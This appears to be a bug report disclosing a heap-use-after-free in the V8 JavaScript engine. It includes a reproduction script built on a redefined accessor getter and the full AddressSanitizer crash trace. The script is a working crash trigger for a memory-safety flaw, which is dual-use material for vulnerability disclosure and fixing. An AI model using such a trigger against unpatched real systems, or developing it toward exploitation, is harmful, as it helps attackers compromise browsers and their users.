<b>VULNERABILITY DETAILS</b>

I'm not sure why this vulnerability occurs.
I guess this vulnerability related with variable allocation and scoping issue
when v8 compiles test.js

This vulnerability occurs in the following conditions:
- define a property with accessor of global scoped object
- define local variables within getter block
- redefine the same object with accessor among variable declarations.


<b>VERSION</b>
v8 5.9.211.31 32/64bit version (asan)
v8 6.1.0 (candidate, current master branch) 64bit version (asan)
I tested in Ubuntu 16.04 64bit.

<b>REPRODUCTION CASE</b>

================ test.js ==================
var proto = {};
Object.defineProperty(proto, 1, {
    get() {
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        Object.defineProperty(proto, 1, { get() {} });
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
        proto = 1;
    }
});

==========================================

$ ~/v8/out/asan/d8 test.js 
=================================================================
==94791==ERROR: AddressSanitizer: heap-use-after-free on address 0x6250000143e0 at pc 0x563323defddf bp 0x7ffeeb7f7cf0 sp 0x7ffeeb7f7ce8
READ of size 8 at 0x6250000143e0 thread T0
    #0 0x563323defdde  (/home/junekim/v8/out/asan/d8+0x731dde)
    #1 0x563323deb1bf  (/home/junekim/v8/out/asan/d8+0x72d1bf)
    #2 0x563323deb037  (/home/junekim/v8/out/asan/d8+0x72d037)
    #3 0x563323de4d01  (/home/junekim/v8/out/asan/d8+0x726d01)
    #4 0x563323de468a  (/home/junekim/v8/out/asan/d8+0x72668a)
    #5 0x563323fb8b81  (/home/junekim/v8/out/asan/d8+0x8fab81)
    #6 0x563323fcbe27  (/home/junekim/v8/out/asan/d8+0x90de27)
    #7 0x563323fc0df0  (/home/junekim/v8/out/asan/d8+0x902df0)
    #8 0x563323fc64d6  (/home/junekim/v8/out/asan/d8+0x9084d6)
    #9 0x563323ca4af0  (/home/junekim/v8/out/asan/d8+0x5e6af0)
    #10 0x563323ca5bc6  (/home/junekim/v8/out/asan/d8+0x5e7bc6)
    #11 0x563323c3f5c8  (/home/junekim/v8/out/asan/d8+0x5815c8)
    #12 0x563323c3f9ce  (/home/junekim/v8/out/asan/d8+0x5819ce)
    #13 0x563323c51aea  (/home/junekim/v8/out/asan/d8+0x593aea)
    #14 0x563323c56b05  (/home/junekim/v8/out/asan/d8+0x598b05)
    #15 0x563323c5f4be  (/home/junekim/v8/out/asan/d8+0x5a14be)
    #16 0x7f56185a982f  (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

0x6250000143e0 is located 736 bytes inside of 8192-byte region [0x625000014100,0x625000016100)
freed by thread T0 here:
    #0 0x563323c0fb72  (/home/junekim/v8/out/asan/d8+0x551b72)
    #1 0x5633253a9b42  (/home/junekim/v8/out/asan/d8+0x1cebb42)
    #2 0x563324d4beea  (/home/junekim/v8/out/asan/d8+0x168deea)
    #3 0x563324dc38a3  (/home/junekim/v8/out/asan/d8+0x17058a3)
    #4 0x563324db59d7  (/home/junekim/v8/out/asan/d8+0x16f79d7)
    #5 0x563324dae343  (/home/junekim/v8/out/asan/d8+0x16f0343)
    #6 0x563324dd89d0  (/home/junekim/v8/out/asan/d8+0x171a9d0)
    #7 0x563324dd2576  (/home/junekim/v8/out/asan/d8+0x1714576)
    #8 0x563324dcb5c5  (/home/junekim/v8/out/asan/d8+0x170d5c5)
    #9 0x563324e10dc4  (/home/junekim/v8/out/asan/d8+0x1752dc4)
    #10 0x563324e0ca9a  (/home/junekim/v8/out/asan/d8+0x174ea9a)
    #11 0x563324e0ae81  (/home/junekim/v8/out/asan/d8+0x174ce81)
    #12 0x563324e08247  (/home/junekim/v8/out/asan/d8+0x174a247)
    #13 0x563324d5976c  (/home/junekim/v8/out/asan/d8+0x169b76c)
    #14 0x563324dd3a9c  (/home/junekim/v8/out/asan/d8+0x1715a9c)
    #15 0x563324dcd260  (/home/junekim/v8/out/asan/d8+0x170f260)
    #16 0x563324e10dc4  (/home/junekim/v8/out/asan/d8+0x1752dc4)
    #17 0x563324e0ca9a  (/home/junekim/v8/out/asan/d8+0x174ea9a)
    #18 0x563324e0ae81  (/home/junekim/v8/out/asan/d8+0x174ce81)
    #19 0x563324e08247  (/home/junekim/v8/out/asan/d8+0x174a247)
    #20 0x563324d5976c  (/home/junekim/v8/out/asan/d8+0x169b76c)
    #21 0x563324db7975  (/home/junekim/v8/out/asan/d8+0x16f9975)
    #22 0x563324dec627  (/home/junekim/v8/out/asan/d8+0x172e627)
    #23 0x563324dde9aa  (/home/junekim/v8/out/asan/d8+0x17209aa)
    #24 0x563324daca9c  (/home/junekim/v8/out/asan/d8+0x16eea9c)
    #25 0x563324d3c795  (/home/junekim/v8/out/asan/d8+0x167e795)
    #26 0x563324d3a7e3  (/home/junekim/v8/out/asan/d8+0x167c7e3)
    #27 0x563324e16f8d  (/home/junekim/v8/out/asan/d8+0x1758f8d)
    #28 0x563323fc0f48  (/home/junekim/v8/out/asan/d8+0x902f48)
    #29 0x563323fc64d6  (/home/junekim/v8/out/asan/d8+0x9084d6)

previously allocated by thread T0 here:
    #0 0x563323c0fea3  (/home/junekim/v8/out/asan/d8+0x551ea3)
    #1 0x5633253a9489  (/home/junekim/v8/out/asan/d8+0x1ceb489)
    #2 0x5633253a9e15  (/home/junekim/v8/out/asan/d8+0x1cebe15)
    #3 0x5633253a9c9b  (/home/junekim/v8/out/asan/d8+0x1cebc9b)
    #4 0x563324d28047  (/home/junekim/v8/out/asan/d8+0x166a047)
    #5 0x563324d4aa4f  (/home/junekim/v8/out/asan/d8+0x168ca4f)
    #6 0x563324dc38a3  (/home/junekim/v8/out/asan/d8+0x17058a3)
    #7 0x563324db59d7  (/home/junekim/v8/out/asan/d8+0x16f79d7)
    #8 0x563324dae343  (/home/junekim/v8/out/asan/d8+0x16f0343)
    #9 0x563324dd89d0  (/home/junekim/v8/out/asan/d8+0x171a9d0)
    #10 0x563324dd2576  (/home/junekim/v8/out/asan/d8+0x1714576)
    #11 0x563324dcb5c5  (/home/junekim/v8/out/asan/d8+0x170d5c5)
    #12 0x563324e10dc4  (/home/junekim/v8/out/asan/d8+0x1752dc4)
    #13 0x563324e0ca9a  (/home/junekim/v8/out/asan/d8+0x174ea9a)
    #14 0x563324e0ae81  (/home/junekim/v8/out/asan/d8+0x174ce81)
    #15 0x563324e08247  (/home/junekim/v8/out/asan/d8+0x174a247)
    #16 0x563324d5976c  (/home/junekim/v8/out/asan/d8+0x169b76c)
    #17 0x563324dd3a9c  (/home/junekim/v8/out/asan/d8+0x1715a9c)
    #18 0x563324dcd260  (/home/junekim/v8/out/asan/d8+0x170f260)
    #19 0x563324e10dc4  (/home/junekim/v8/out/asan/d8+0x1752dc4)
    #20 0x563324e0ca9a  (/home/junekim/v8/out/asan/d8+0x174ea9a)
    #21 0x563324e0ae81  (/home/junekim/v8/out/asan/d8+0x174ce81)
    #22 0x563324e08247  (/home/junekim/v8/out/asan/d8+0x174a247)
    #23 0x563324d5976c  (/home/junekim/v8/out/asan/d8+0x169b76c)
    #24 0x563324db7975  (/home/junekim/v8/out/asan/d8+0x16f9975)
    #25 0x563324dec627  (/home/junekim/v8/out/asan/d8+0x172e627)
    #26 0x563324dde9aa  (/home/junekim/v8/out/asan/d8+0x17209aa)
    #27 0x563324daca9c  (/home/junekim/v8/out/asan/d8+0x16eea9c)
    #28 0x563324d3c795  (/home/junekim/v8/out/asan/d8+0x167e795)
    #29 0x563324d3a7e3  (/home/junekim/v8/out/asan/d8+0x167c7e3)

SUMMARY: AddressSanitizer: heap-use-after-free (/home/junekim/v8/out/asan/d8+0x731dde) 
Shadow bytes around the buggy address:
  0x0c4a7fffa820: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4a7fffa830: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4a7fffa840: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4a7fffa850: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4a7fffa860: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c4a7fffa870: fd fd fd fd fd fd fd fd fd fd fd fd[fd]fd fd fd
  0x0c4a7fffa880: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4a7fffa890: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4a7fffa8a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4a7fffa8b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c4a7fffa8c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==94791==ABORTING

